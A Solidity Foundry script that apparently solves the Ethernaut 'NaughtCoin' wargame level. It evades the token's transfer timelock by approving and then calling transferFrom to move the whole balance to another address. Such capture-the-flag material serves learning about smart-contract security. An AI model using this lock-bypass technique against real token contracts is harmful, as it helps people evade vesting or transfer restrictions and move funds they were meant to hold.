// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import { Script } from "forge-std/Script.sol";
import { EthernautScript } from "src/common/EthernautScript.sol";
import { NaughtCoin } from "./Problem.sol";
import 'openzeppelin-contracts/token/ERC20/IERC20.sol';


contract SolutionScript is EthernautScript {

    function solve(address payable _instanceAddress) internal override {
        NaughtCoin naughtCoin = NaughtCoin(_instanceAddress);
        address receiver = address(12345);

        vm.startBroadcast();
        naughtCoin.approve(tx.origin, naughtCoin.balanceOf(tx.origin));
        naughtCoin.transferFrom(tx.origin, receiver, naughtCoin.balanceOf(tx.origin));
        vm.stopBroadcast();

        assert(naughtCoin.balanceOf(tx.origin) == 0);
    }

    function getLevelAddress() internal view override returns(address) {
        return 0x096bb5e93a204BfD701502EB6EF266a950217218;
    }
}

